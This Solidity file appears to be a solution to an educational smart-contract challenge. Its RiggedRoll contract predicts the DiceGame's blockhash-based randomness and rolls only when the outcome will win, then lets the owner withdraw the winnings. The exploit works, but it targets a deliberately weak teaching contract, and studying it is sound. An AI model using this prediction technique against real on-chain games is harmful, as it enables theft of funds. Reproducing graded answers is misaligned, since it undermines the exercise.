pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Insufficient Balance");
        // if (address(this).balance < 0.002 ether) {
        //     console.log("Insufficient Balance of:", address(this).balance);
        //     return;
        // }

        bytes32 previousHash = blockhash(block.number - 1);
        uint256 _nonce = diceGame.nonce();
        // console.log("NONCE:", _nonce);
        bytes32 hash = keccak256(abi.encodePacked(previousHash, address(diceGame), _nonce));
        uint256 roll = uint256(hash) % 16;
        require(roll <= 2, "Try Again!!");
        // if(roll <= 2) {
        // }
        // console.log(roll);
        // if (roll > 2) {
        //     // console.log("TRY AAGAIN!!");
        // }
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address receiver, uint256 amount) public onlyOwner {
        (bool success, ) = payable(receiver).call{value: amount}("");
        require(success, "Transfer failed!");
    }


    //Add receive() function so contract can receive Eth
    receive() external payable {}
    fallback() external payable {}
}
